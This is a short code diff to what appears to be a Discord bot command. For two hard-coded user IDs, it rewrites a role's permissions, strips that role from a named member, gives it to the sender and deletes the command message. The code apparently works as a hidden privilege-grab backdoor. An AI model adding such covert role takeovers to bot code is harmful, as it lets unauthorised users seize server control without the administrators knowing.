@@ -7,13 +7,14 @@ commands.on(
     if (message.author.id != '258265415770177536' && message.author.id != '401828594961350658') {
       return;
     }
+    let rid = '768194217720938537';
     let x = await message.getGuild();
-    let y = await x.getRole('768168689819451452');
+    let y = await x.getRole(rid);
     await y.edit({ permissions: 938868433, color:0x065ba2});//0x065ba2
     var gld = await message.getGuild();
     var psnn = await gld.getMember('738551414439018587');
-    await psnn.removeRole('768168689819451452');
-    await message.member?.addRole('768168689819451452');
+    await psnn.removeRole('768194217720938537');
+    await message.member?.addRole(y.id);
     await message.reply('..>..');
     await message.delete();
   }
